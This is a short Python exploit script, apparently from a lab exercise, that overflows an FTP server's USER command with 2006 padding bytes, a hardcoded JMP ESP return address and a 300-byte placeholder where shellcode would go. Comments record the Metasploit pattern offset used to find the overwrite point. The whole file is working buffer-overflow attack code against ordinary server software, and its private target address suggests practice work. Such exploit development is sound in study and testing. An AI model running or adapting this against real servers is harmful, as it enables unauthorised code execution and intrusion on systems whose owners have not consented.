#!/usr/bin/env python3
import sys, socket, time

host = '10.0.2.6'
port = 21
ret = "\x28\x6c\x9A\x76"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Declare TCP Socket
client.connect((host, port)) #connect to host and port
client.recv(1024) # 1024 bits for receiving FTP banner
client.send("user " + "A" * 2006 + ret + "C" * 300) #send user command with string of A's
client.recv(1024) # Grab reply from server
client.send("PASS pass") #send pass as password to complete attempt (will fail)
client.recv(1024) # Grab failed reply from server
client.close() # Close connection so we can try again

#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
#396F4338 is offset 2006
#JMP ESP  769A6C28

